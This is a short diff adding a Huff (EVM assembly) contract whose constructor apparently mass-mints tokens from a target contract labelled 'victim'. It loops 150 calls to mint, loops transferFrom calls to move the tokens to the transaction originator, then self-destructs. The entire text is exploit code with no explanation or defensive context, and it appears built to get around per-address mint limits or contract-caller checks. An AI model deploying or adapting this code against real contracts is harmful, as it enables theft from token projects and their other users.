@@ -1,0 +1,30 @@
+#define macro CONSTRUCTOR() = takes(0) returns (0) {
+    0x40 dup1 codesize sub returndatasize codecopy 
+    0x20 mload
+    returndatasize mload
+    0x1249c58b 0xe0 shl returndatasize mstore
+    address
+    0x04 
+    0x23b872dd 0xe0 shl
+    // 0x03 // i
+    0x96 // (100)
+    mint_loop:
+        returndatasize returndatasize dup5 returndatasize returndatasize dup10 gas call 
+        swap1 sub dup1 mint_loop jumpi
+    
+    mstore mstore origin 0x24 mstore 
+     // [victim,tokenOffset]
+    0x44 // [68,victim,tokenOffset]
+    0x64 // [100,68,victim,tokenOffset]
+    dup4 0x96 add // [i (tokenOffset + 2),100,68,victim,tokenOffset]
+    transfer_loop:
+        dup1 dup4 mstore // mstore(68,i)
+        returndatasize returndatasize dup4 returndatasize returndatasize dup9 gas call 
+        swap1 sub dup1 dup6 lt transfer_loop jumpi
+
+    origin selfdestruct
+}
+
+#define macro MAIN() = takes (0) returns (0) {
+
+}
